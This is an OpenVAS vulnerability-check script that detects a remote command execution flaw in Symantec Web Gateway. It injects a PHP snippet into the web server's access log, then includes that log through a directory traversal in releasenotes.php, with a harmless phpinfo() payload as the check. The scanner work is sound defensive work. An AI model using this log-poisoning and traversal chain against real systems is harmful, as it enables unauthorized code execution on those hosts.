##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_web_gateway_cmd_exec_vuln.nasl 5940 2017-04-12 09:02:05Z teissa $
#
# Symantec Web Gateway Remote Shell Command Execution Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploits will result in the execution of arbitrary attack supplied
  commands in the context of the affected application.
  Impact Level: System/Application";
tag_affected = "Symantec Web Gateway versions 5.0.x before 5.0.3";
tag_insight = "The flaw is due to an improper validation of certain unspecified
  input. This can be exploited to execute arbitrary code by injecting crafted
  data or including crafted data.";
tag_solution = "Upgrade to Symantec Web Gateway version 5.0.3 or later,
  For updates refer to http://www.symantec.com/business/web-gateway";
tag_summary = "This host is running Symantec Web Gateway and is prone to command
  execution vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802632";
CPE = "cpe:/a:symantec:web_gateway";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5940 $");
  script_bugtraq_id(53444, 53443);
  script_cve_id("CVE-2012-0297", "CVE-2012-0299");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-04-12 11:02:05 +0200 (Wed, 12 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-06-01 12:12:12 +0530 (Fri, 01 Jun 2012)");
  script_name("Symantec Web Gateway Remote Shell Command Execution Vulnerability");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_symantec_web_gateway_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("symantec_web_gateway/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://secunia.com/advisories/49216");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18932");
  script_xref(name : "URL" , value : "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120517_00");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
dir = "";
url = "";
port = 0;

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Symantec Web Gateway Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)) {
  exit(0);
}

## Construct attack request
exploit= 'GET ' + dir + '/<?php phpinfo();?> HTTP/1.1\r\n\r\n';
res = http_send_recv(port: port, data: exploit);

## Try to access log file
url = dir + "/spywall/releasenotes.php?relfile=../../../../../usr/local/" +
            "apache2/logs/access_log";

## Confirm exploit worked by checking the log file
if(http_vuln_check( port: port, url: url, check_header: TRUE,
                    pattern: "<title>phpinfo()",
                    extra_check: "<title>Symantec Web Gateway")) {
  security_message(port);
}
